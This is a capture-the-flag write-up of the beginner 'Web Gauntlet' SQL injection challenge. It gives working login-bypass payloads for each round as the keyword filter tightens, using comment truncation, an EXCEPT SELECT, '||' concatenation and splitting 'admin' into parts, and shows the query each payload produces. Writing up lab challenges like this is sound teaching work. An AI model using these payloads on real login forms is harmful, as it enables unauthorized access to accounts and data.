# Web Gauntlet
**A beginner SQLI Web Exploitation challenge.**

- First, we click the website and the filter. If we try to log into the website, we will get "Invalid username/password". We can check the filter and see that the word "or" is being filtered through the server, so we can not include it in the username or password. 

- There are many ways to perform an SQLI, so we will try to do it without the classic username: "admin" password: 'OR '1'='1 statement. We can use the comment syntax to comment out the rest of the query after the username identification. A way to do that is the following:

```
Username: admin' --
Password: random_pass
```

We get the following statement: 
```
SELECT * FROM users WHERE username='admin' --' AND password='random_pass'
```

- We can see now that the SQLI is successful. But the filter.php has been updated to filter out more words. Now we can not use any of these words "or and like = --". So our previous SQLI is not accepted. Though, we can still find a way to comment out the rest of the query after the username identification. A way to do that is the following:

```
Username: admin' '/*'
Password: */ except select '1','1
``` 

We get the following statement: 
```
SELECT * FROM users WHERE username='admin' /*' AND password='*/ except select '1','1' 
```
(The password identification is being commented out and the remaining tick character is being joined with an except select statement, where you should make sure that the number of '1' matches the number of columns in the users table)

- The SQLI is successful. This time the filter.php file is updated and we can not use any of these words "or and = like > < --"(Note that we cannot use the space character as we can verify this from the raw hex response of the filter.php file, you can use hexdump or xxd on the login.php file to see that). We can try commenting out the password identification and pair the remaining tick character with a simple concatenation. A way to do that is the following:

```
Username: admin'/*
Password: */||'
``` 

We get the following statement: 
```
SELECT * FROM users WHERE username='admin'/*' AND password='*/||''
```

- The SQLI is successful. The filter.php has been updated to filter out the words: "or and = like > < -- admin". Now, we can simply create the same attack as previously, but making the word "admin" as a concatenation of 2 words. A way to do that is the following:

```
Username: ad'||'min'/*
Password: */||'
``` 

We get the following statement: 
```
SELECT * FROM users WHERE username='ad'||'min'/*' AND password='*/||''
```

- The SQLI is successful. The filter.php has been updated to filter out the words: "or and = like > < -- admin union". Now, we can simply create the same attack as previously, because the new filter restrictions do not bother us.

```
Username: ad'||'min'/*
Password: */||'
```

- The SQLI is successful, and finally you should be able to see the flag in the filter.php file.
